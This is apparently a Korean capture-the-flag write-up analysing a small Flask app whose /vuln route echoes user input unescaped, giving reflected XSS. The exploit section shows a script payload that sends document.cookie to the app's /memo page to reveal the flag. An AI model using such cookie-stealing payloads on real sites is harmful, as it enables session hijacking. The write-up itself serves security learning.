## 취약점 분석

### memo 함수

```python
@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)
```

* 이용자가 전달한 memo 파라미터 값을 render_template 함수를 통해 기록하고 출력합니다.


### vuln 함수

```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "") # 이용자가 입력한 vuln 인자를 가져옴
    return param # 이용자의 입력값을 화면 상에 표시
```

* 이용자가 입력한 값을 페이지에 그래도 출력합니다.

⇨ memo 함수와 vuln 함수 둘다 이용자가 입력한 값을 페이지에 그대로 출력하고 있습니다.

⇨ render_template 함수를 사용하는 memo 함수는 변수가 기록될 때 HTML 엔티티코드로 변환되서 저장되는데, vuln은 그냥 출력하고 있어서 XSS 취약점이 발생합니다.


<br>


## 익스플로잇

<img src="https://velog.velcdn.com/images/silvergun8291/post/12c1903c-92cb-4055-9fd9-6b086a16ac40/image.png">

문제 사이트에 접속하면 3개의 연결된 페이지들의 목록이 나옵니다.

#

![](https://velog.velcdn.com/images/silvergun8291/post/214fb9f1-1837-4480-9b4c-b69af70254fc/image.png)

flag 페이지로 들어가면 입력창이 떠서 XSS 공격을 시도해볼 수 있습니다.

<br>

```html
<script>location.href = "/memo?memo=" + document.cookie;</script>
```

script 태그를 이용해서 XSS 공격을 시도해 보면

#

<img src="https://velog.velcdn.com/images/silvergun8291/post/bfe59d5d-23da-48e2-99a7-92c22373df13/image.png">

공격이 성공해서 FLAG가 출력되었습니다.



